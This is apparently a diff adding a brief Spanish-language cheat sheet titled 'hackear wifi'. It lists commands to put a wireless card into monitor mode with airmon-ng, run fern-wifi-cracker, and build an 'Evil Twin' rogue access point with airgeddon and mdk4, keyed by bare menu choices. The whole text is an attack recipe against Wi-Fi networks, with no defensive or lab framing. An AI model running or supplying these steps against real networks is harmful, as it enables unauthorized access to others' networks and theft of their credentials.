@@ -1,0 +1,21 @@
+hackear wifi 
+
+iwconfig  //seleccionamos nuestra tarjeta de red
+
+sudo airmon-ng check kill
+airmon-ng  start //nuetra tarjeta de red 
+fern-wifi-cracker
+
+Creacion de Evil Twin 
+
+sudo airgeddon
+//seleccionamos nuestra adaptador de red
+opción 7
+opción 9
+enter
+//seleccionamos nuestra red
+mdk4
+n
+n
+n
+20
